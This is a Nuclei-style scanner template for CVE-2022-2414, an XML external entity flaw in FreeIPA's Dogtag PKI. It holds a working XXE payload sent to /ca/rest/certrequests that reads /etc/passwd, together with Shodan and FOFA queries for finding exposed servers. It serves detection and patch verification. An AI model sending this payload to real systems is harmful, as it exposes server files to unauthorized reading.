http:
- matchers:
  - part: body
    regex:
    - 'root:.*:0:0:'
    type: regex
  - part: body
    type: word
    words:
    - PKIException
  - part: header
    type: word
    words:
    - application/xml
  - status:
    - 400
    type: status
  matchers-condition: and
  raw:
  - "POST /ca/rest/certrequests HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/xml\n\
    \n<!--?xml version=\"1.0\" ?-->\n<!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///etc/passwd\"\
    > ]>\n<CertEnrollmentRequest>\n  <Attributes/>\n  <ProfileID>&ent;</ProfileID>\n\
    </CertEnrollmentRequest>\n"
id: CVE-2022-2414
info:
  author: DhiyaneshDk
  classification:
    cpe: cpe:2.3:a:dogtagpki:dogtagpki:10.5.18:*:*:*:*:*:*:*
    cve-id: CVE-2022-2414
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-611
    epss-percentile: 0.84092
    epss-score: 0.01256
  description: 'Access to external entities when parsing XML documents can lead to
    XML external entity (XXE) attacks. This flaw allows a remote attacker to potentially
    retrieve the content of arbitrary files by sending specially crafted HTTP requests.

    '
  impact: 'An attacker can exploit this vulnerability to gain unauthorized access
    to sensitive information stored on the server.

    '
  metadata:
    fofa-query: title="Identity Management"
    max-request: 1
    product: dogtagpki
    shodan-query: title:"Identity Management" html:"FreeIPA"
    vendor: dogtagpki
    verified: true
  name: FreeIPA - XML Entity Injection
  reference:
  - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/webapp/Dogtag/Dogtag%20PKI%20XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2022-2414.md
  - https://nvd.nist.gov/vuln/detail/CVE-2022-2414
  - https://github.com/dogtagpki/pki/pull/4021
  remediation: 'Apply the latest security patches and updates provided by the vendor
    to fix the XML Entity Injection vulnerability in FreeIPA.

    '
  severity: high
  tags: cve,cve2022,dogtag,freeipa,xxe,dogtagpki
